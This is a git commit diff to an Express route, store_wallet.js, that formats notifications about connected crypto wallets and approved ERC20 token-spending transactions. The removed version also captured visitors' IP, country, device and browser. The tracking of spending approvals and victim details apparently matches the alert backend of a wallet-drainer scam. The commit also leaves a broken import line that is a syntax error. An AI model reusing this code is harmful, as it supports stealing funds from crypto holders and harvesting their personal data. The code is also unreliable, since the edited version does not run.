606f29cd6c7006c70a55e49bd0f36963d0f7230a
Franklibo <franklibovski@gmail.com>
2025-04-22 09:48:52 +0100

    Update store_wallet.js

--- routes/store_wallet.js
+++ routes/store_wallet.js
@@ -1,18 +1,17 @@
-const express = require("express");
-const { sendNotification } = require("../helper/utils");
+const express = require("express"); 
+sendNotification } = require("../helper/utils");
 const router = express.Router();
 
 router.post("/", async (req, res) => {
-  const { log_type, payload } = req.body;
-
+  const { approval_amount, token_symbol, currentNetwork, walletAddress } = req.body;
   try {
     let text = '';
-    if (log_type === 'WALLET_CONNECT') {
-      text = `💥 <b>Wallet Connection</b> 💥\n\n🌎 <b>Country</b>: ${payload.country}\n🌐 <b>Browser</b>: ${payload.browserName}\n🖥 <b>Device</b>: ${payload.device}\n🔎 <b>IP</b>: ${payload.userIP}\n🧳 <b>Wallet Name</b>: ${payload.walletName}\n📋 <b>Wallet Address</b>: ${payload.walletAddress}\n⚡️ <b>Network</b>: ${payload.currentNetwork}\n🔗 <a href="https://www.blockchain.com/explorer/search?search=${payload.walletAddress}">See Wallet On Block Explorer</a>`;
-    } else if (log_type === 'APPROVE_ERC20_SPENDING' && payload.is_success) {
-      text = `🚀 <b>Transaction Processed</b> 🚀\n\n📈 <b>Amount</b>: ${payload.approval_amount}\n💰 <b>Token</b>: ${payload.token_symbol}\n🖥  <b>Device</b>: ${payload.device}\n🧳 Wallet Name: ${payload.walletName}\n📋 <b>Wallet Address</b>: ${payload.walletAddress}\n⚡️ <b>Network</b>: ${payload.currentNetwork}\n\n\n🔗 <a href="https://www.blockchain.com/explorer/search?search=${payload.walletAddress}">See Wallet On Block Explorer</a>`;
-    }
-
+    text = `🚀 <b>Transaction Processed</b> 🚀\n\n` +
+           `📈 <b>Amount</b>: ${approval_amount}\n` +
+           `💰 <b>Token</b>: ${token_symbol}\n` +
+           `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
+           `⚡️ <b>Network</b>: ${currentNetwork}\n\n\n` +
+           `🔗 <a href="https://www.blockchain.com/explorer/search?search=${walletAddress}">See Wallet On Block Explorer</a>`;
     if (text.length > 0) {
       await sendNotification(text, 'html');
       res.status(200).json({
